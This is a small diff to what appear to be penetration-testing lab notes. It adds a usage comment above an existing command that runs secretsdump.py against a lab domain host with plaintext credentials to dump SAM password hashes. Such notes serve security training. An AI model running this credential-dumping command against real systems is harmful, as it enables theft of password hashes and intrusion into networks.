@@ -75,6 +75,6 @@ Then we can do `ls`
 
 ```powershell
 # Dumping SAM hashes
-
+# secretsdump.py <domain user>
 $ secretsdump.py MARVEL.local/fcastle:Password1@192.168.0.132
 ```
